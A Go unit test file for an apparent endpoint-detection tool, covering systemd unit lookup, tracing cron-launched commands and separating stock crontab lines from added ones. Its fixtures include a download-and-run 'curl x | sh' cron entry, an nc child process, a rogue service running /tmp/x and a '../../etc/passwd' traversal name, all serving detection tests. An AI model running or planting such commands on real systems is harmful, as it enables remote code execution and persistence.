package persist

import (
	"testing"

	"xdr/internal/proc"
	"xdr/internal/testfs"
)

func TestUnitFile_Order(t *testing.T) {
	root := testfs.Root(t)
	testfs.File(t, root, "/etc/systemd/system/evil.service", "[Service]\nExecStart=/tmp/x\n", 0o644)
	testfs.File(t, root, "/lib/systemd/system/evil.service", "[Service]\nExecStart=/bin/true\n", 0o644)
	p, h, err := UnitFile(root, "evil.service")
	if err != nil || p != "/etc/systemd/system/evil.service" || h != sum([]byte("[Service]\nExecStart=/tmp/x\n")) {
		t.Fatalf("%q %q %v", p, h, err)
	}
	testfs.File(t, root, "/usr/lib/systemd/system/getty@.service", "getty", 0o644)
	if p, h, err := UnitFile(root, "getty@tty1.service"); err != nil || p != "/usr/lib/systemd/system/getty@.service" || h != sum([]byte("getty")) {
		t.Fatalf("template: %q %q %v", p, h, err)
	}
	testfs.Symlink(t, root, "/etc/systemd/system/link.service", "/lib/systemd/system/evil.service")
	if _, _, err := UnitFile(root, "link.service"); err == nil {
		t.Fatal("symlink followed")
	}
	if _, _, err := UnitFile(root, "none.service"); err == nil {
		t.Fatal("missing unit found")
	}
	if _, _, err := UnitFile(root, "../../etc/passwd"); err == nil {
		t.Fatal("path in name")
	}
}

func TestCronCommand(t *testing.T) {
	cron := &proc.Proc{PID: 10, Comm: "cron", Exe: "/usr/sbin/cron"}
	sh := &proc.Proc{PID: 11, PPID: 10, Comm: "sh", Exe: "/usr/bin/dash", Cmdline: []string{"/bin/sh", "-c", "curl x | sh"}}
	nc := &proc.Proc{PID: 12, PPID: 11, Comm: "nc", Exe: "/usr/bin/nc.openbsd"}
	if got := CronCommand([]*proc.Proc{nc, sh, cron}); got != "curl x | sh" {
		t.Fatalf("got %q", got)
	}
	apache := &proc.Proc{PID: 9, Comm: "apache2", Exe: "/usr/sbin/apache2"}
	if got := CronCommand([]*proc.Proc{nc, sh, apache}); got != "" {
		t.Fatalf("no cron: %q", got)
	}
	if got := CronCommand([]*proc.Proc{cron}); got != "" {
		t.Fatalf("cron alone: %q", got)
	}
}

func TestStockCron(t *testing.T) {
	root := testfs.Root(t)
	stock := "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"
	testfs.File(t, root, "/etc/crontab", stock, 0o644)
	testfs.File(t, root, "/var/spool/cron/crontabs/root", "* * * * * curl x | sh\n* * * * * run-parts /tmp\n", 0o600)
	is := StockCron(root, func(s string) bool { return s == sum([]byte(stock)) })
	if !is("cd / && run-parts --report /etc/cron.hourly") {
		t.Fatal("stock line not seen")
	}
	if is("curl x | sh") || is("run-parts /tmp") {
		t.Fatal("non-baseline crontab counted as stock")
	}
}
